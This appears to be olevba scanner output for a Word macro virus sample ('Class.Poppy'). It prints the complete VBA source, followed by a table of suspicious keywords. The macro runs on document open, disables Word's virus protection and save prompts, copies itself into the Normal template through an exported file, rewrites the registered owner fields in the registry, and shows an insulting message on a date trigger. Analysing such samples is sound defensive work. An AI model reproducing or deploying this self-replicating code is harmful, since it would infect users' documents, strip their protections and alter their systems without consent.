olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-a60817369d0a076d789f29346331f6311610cf30
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-a60817369d0a076d789f29346331f6311610cf30 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
On Error GoTo out
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
Options.VirusProtection = False
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
Options.SaveNormalPrompt = False
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
Options.ConfirmConversions = False
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
If nt > 70 And ad > 0 Then GoTo out
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
If nt < 70 Then
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
End If
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
host.codemodule.AddFromFile ("c:\class.sys")
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
With host.codemodule
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    For x = 1 To 16
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    .deletelines 1
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    Next x
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
End With
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
If nt < 70 Then
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    With host.codemodule
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    .replaceline 1, "Sub AutoClose()"
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    .replaceline 91, "Sub ToolsMacro()"
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    For x = 70 To 81
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
        .deletelines 62
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    Next x
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    .replaceline 35, "    For x = 1 To 4"
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    End With
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
End If
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
If nt < 70 Then
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
u = RegCloseKey(k)
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
End If
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
With host.codemodule
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    For x = 2 To 104 Step 2
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
    Next x
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
End With
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
out:
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
End Sub
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
Sub ViewVBCode()
'cmp2_hayange11/05/2004 17:32:24Lexmark  E320 on LPT1:Les activités
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
